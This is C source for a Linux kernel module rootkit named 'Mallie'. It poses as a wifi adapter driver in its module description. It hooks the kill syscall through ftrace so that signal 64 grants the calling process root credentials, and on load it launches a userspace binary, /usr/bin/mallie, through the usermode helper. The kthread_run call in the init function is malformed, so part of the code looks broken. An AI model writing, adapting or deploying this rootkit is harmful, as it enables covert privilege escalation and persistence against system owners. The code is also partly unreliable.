#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

// Check kernel compiled options
// https://www.walkernews.net/2008/11/21/how-to-check-what-kernel-build-options-enabled-in-the-linux-kernel/
// cat /boot/config-`uname -r` | grep CONFIG_NETFILTER

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mallie");
MODULE_DESCRIPTION("Driver for rtl8192eu wifi adapter.");
MODULE_VERSION("0.1");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused) 
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};


/* Execute process in userspace */
int alter_uid_gid(uid_t uid, gid_t gid, struct cred *new)
{
        new->uid = new->euid = new->suid = new->fsuid = KUIDT_INIT(uid);
        new->gid = new->egid = new->sgid = new->fsgid = KGIDT_INIT(gid);
        return 0;
}

static int init_func(struct subprocess_info *info, struct cred *new)
{
        printk("[%d]\n", current->pid);
        alter_uid_gid(1000, 1000, new);
        return 0;
}

static int user_process_exec(void *data)
{
    struct subprocess_info *sub_info;
    int ret = 0;
    char *path = (char *)data;
    char *argv[] = {path, NULL};
    static char *envp[] = {"HOME=/", "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC,
            init_func, NULL, NULL);
    if (sub_info == NULL) return -ENOMEM;

    ret = call_usermodehelper_exec(sub_info, UMH_KILLABLE);
    pr_info("%s: ret %d\n", __func__, ret);
    do_exit(0);

    return ret;
}

/* Function that runs when LKM initiated */

static int __init mallie_module_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    char *path = "/bin/bash";
    kthread_run(user_process_exec("/usr/bin/mallie"), path, "user_process_exec");

	if (err) 
	{
		printk(KERN_INFO "Mallie: Failed to install hooks.");
		return err;
	}

	printk(KERN_INFO "Mallie loaded.\n");

	return 0;
}

static void __exit mallie_module_exit(void)
{
	/* Remove the hooks */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Mallie: Exiting...\n");
}

module_init(mallie_module_init);
module_exit(mallie_module_exit);
